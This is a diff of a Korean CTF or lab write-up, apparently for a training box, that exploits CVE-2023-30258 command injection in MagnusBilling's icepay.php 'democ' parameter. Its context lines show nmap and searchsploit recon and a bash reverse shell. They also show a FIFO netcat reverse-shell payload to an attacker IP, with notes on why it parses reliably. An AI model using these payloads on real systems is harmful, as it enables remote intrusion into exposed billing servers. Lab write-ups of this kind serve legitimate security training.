@@ -4,8 +4,8 @@ hint: https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md
 
 ## 🎯 타겟 시스템 정보
 
-- **IP**: 10.10.13.178
-- **OS**: Linux (Debian 기반)
+- IP: 10.10.13.178
+- OS: Linux (Debian 기반)
 
 ## 📡 1단계: 초기 포트 스캔 및 서비스 발견
 
@@ -15,7 +15,7 @@ hint: https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md
 nmap -Pn -sC -sV -oN scan.txt -p- 10.10.13.178
 ```
 
-**발견된 서비스:**
+발견된 서비스:
 | 포트 | 서비스 | 버전 | 상태 |
 |------|--------|------|------|
 | 22 | SSH | OpenSSH 9.2p1 Debian | 열림 |
@@ -23,7 +23,7 @@ nmap -Pn -sC -sV -oN scan.txt -p- 10.10.13.178
 | 3306 | MySQL | MariaDB | 열림 (인증 필요) |
 | 5038 | Asterisk | Call Manager 2.10.6 | 열림 |
 
-**핵심 발견사항:**
+핵심 발견사항:
 
 - `/mbilling/` 디렉토리가 robots.txt에서 발견됨
 - HTTP 서비스가 자동으로 `/mbilling/`로 리다이렉트됨
@@ -37,7 +37,7 @@ nmap -Pn -sC -sV -oN scan.txt -p- 10.10.13.178
 curl -s http://10.10.13.178/mbilling/ | grep -i version
 ```
 
-**발견된 애플리케이션**: MagnusBilling (VoIP 빌링 시스템)
+발견된 애플리케이션: MagnusBilling (VoIP 빌링 시스템)
 
 ### B. Asterisk Call Manager (포트 5038)
 
@@ -46,12 +46,12 @@ curl -s http://10.10.13.178/mbilling/ | grep -i version
 nc -nv 10.10.13.178 5038
 ```
 
-**연결 결과:**
+연결 결과:
 
 - Asterisk Call Manager/2.10.6 실행 중
 - 기본 크리덴셜 시도: admin/admin → 인증 실패
 
-**사용한 netcat 옵션:**
+사용한 netcat 옵션:
 
 - `-n`: DNS 조회 비활성화 (속도 향상)
 - `-v`: verbose 모드 (연결 상태 출력)
@@ -64,7 +64,7 @@ nc -nv 10.10.13.178 5038
 searchsploit Asterisk
 ```
 
-**결과**: 다수의 DoS 취약점 발견되었으나 원격 코드 실행 취약점은 제한적
+결과: 다수의 DoS 취약점 발견되었으나 원격 코드 실행 취약점은 제한적
 
 ### MagnusBilling 취약점 검색
 
@@ -72,23 +72,23 @@ searchsploit Asterisk
 searchsploit magnus
 ```
 
-**🚨 중요 발견**: CVE-2023-30258 - Command Injection 취약점
+🚨 중요 발견: CVE-2023-30258 - Command Injection 취약점
 
-- **파일**: `/usr/share/exploitdb/exploits/multiple/webapps/52170.txt`
-- **영향 버전**: MagnusBilling 7.3.0
-- **취약점 유형**: 명령어 주입 (Command Injection)
+- 파일: `/usr/share/exploitdb/exploits/multiple/webapps/52170.txt`
+- 영향 버전: MagnusBilling 7.3.0
+- 취약점 유형: 명령어 주입 (Command Injection)
 
 ## 💥 4단계: 발견된 취약점 분석
 
 ### CVE-2023-30258 상세 정보
 
-**취약한 엔드포인트:**
+취약한 엔드포인트:
 
 ```
 /lib/icepay/icepay.php?democ=<payload>
 ```
 
-**PoC (Proof of Concept):**
+PoC (Proof of Concept):
 
 ```bash
 # 기본 명령어 주입 테스트
@@ -101,11 +101,11 @@ curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20
 
 ## 🚫 현재 직면한 문제들
 
-1. **연결 문제**: 일부 curl/gobuster 명령에서 연결 거부 발생
+1. 연결 문제: 일부 curl/gobuster 명령에서 연결 거부 발생
 
    - 방화벽 또는 서비스 다운타임 가능성
 
-2. **디렉토리 이뉴머레이션 실패**: gobuster 실행 중 연결 오류
+2. 디렉토리 이뉴머레이션 실패: gobuster 실행 중 연결 오류
 
 ## 🎯 다음 단계 액션 플랜
 
@@ -358,12 +358,12 @@ curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bas
 
 | 원인                                                   | 설명                                                                                                                                               |
 | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `bash -c` 내부의 리디렉션 구문 (`>&`, `0>&1`)          | Bash는 이중 리디렉션에서 **인용 오류**, 또는 `ambiguous redirect`가 발생하기 쉽습니다. 특히, 웹에서 인젝션될 때는 `>`나 `&`가 제대로 해석되지 않음 |
+| `bash -c` 내부의 리디렉션 구문 (`>&`, `0>&1`)          | Bash는 이중 리디렉션에서 인용 오류, 또는 `ambiguous redirect`가 발생하기 쉽습니다. 특히, 웹에서 인젝션될 때는 `>`나 `&`가 제대로 해석되지 않음 |
 | 작은따옴표 (`'`) 포함                                  | URL 인코딩이 불완전하면 서버에서 구문 파싱 오류 발생 가능                                                                                          |
 | 단일 파이프라인 방식                                   | 네트워크 지연이나 세션 종료 시 취약                                                                                                                |
 | 일부 웹쉘에서는 `bash` 명령이 제한되거나 `sh`만 허용됨 | `sh`는 내장 기능이 적지만 더 호환성 높음                                                                                                           |
 
-결론적으로 **복잡한 리디렉션 구조와 bash 의존** 때문에 파싱 오류가 발생하거나 명령이 실행되지 않았을 수 있습니다.
+결론적으로 복잡한 리디렉션 구조와 bash 의존 때문에 파싱 오류가 발생하거나 명령이 실행되지 않았을 수 있습니다.
 
 ---
 
@@ -393,11 +393,11 @@ democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f
 
 | 이유                         | 설명                                                               |
 | ---------------------------- | ------------------------------------------------------------------ |
-| **단일 셸 (`sh`) 사용**      | `bash -c` 대신 `sh`를 직접 사용하여 복잡한 파싱 없이 명령 실행     |
-| **FIFO 파이프 방식**         | 전통적인 안정적 리버스 셸 방식. 입력/출력을 분리하여 세션이 안정적 |
-| **명확한 리디렉션**          | `2>&1`, `>`, 파이프가 명확하게 사용되어 ambiguity가 없음           |
-| **작은따옴표 없음**          | `'bash -i'` 같이 shell 내부 구문 문제가 없음                       |
-| **URL 인코딩 올바르게 적용** | `--data-urlencode`를 사용해 명령 전체가 올바르게 인코딩되어 전송됨 |
+| 단일 셸 (`sh`) 사용      | `bash -c` 대신 `sh`를 직접 사용하여 복잡한 파싱 없이 명령 실행     |
+| FIFO 파이프 방식         | 전통적인 안정적 리버스 셸 방식. 입력/출력을 분리하여 세션이 안정적 |
+| 명확한 리디렉션          | `2>&1`, `>`, 파이프가 명확하게 사용되어 ambiguity가 없음           |
+| 작은따옴표 없음          | `'bash -i'` 같이 shell 내부 구문 문제가 없음                       |
+| URL 인코딩 올바르게 적용 | `--data-urlencode`를 사용해 명령 전체가 올바르게 인코딩되어 전송됨 |
 
 ---
 
@@ -405,10 +405,10 @@ democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f
 
 | 요소                  | 설명                                          |
 | --------------------- | --------------------------------------------- |
-| **명령어 간결화**     | `sh` 사용으로 복잡도 최소화                   |
-| **URL 인코딩 철저히** | 파라미터 내 특수 문자 안전 처리 필요          |
-| **파이프/FIFO 활용**  | 입력-출력 연결 구조 명확                      |
-| **bash 의존 최소화**  | bash는 일부 시스템에서 사용 불가하거나 제한됨 |
+| 명령어 간결화     | `sh` 사용으로 복잡도 최소화                   |
+| URL 인코딩 철저히 | 파라미터 내 특수 문자 안전 처리 필요          |
+| 파이프/FIFO 활용  | 입력-출력 연결 구조 명확                      |
+| bash 의존 최소화  | bash는 일부 시스템에서 사용 불가하거나 제한됨 |
 
 ---
 
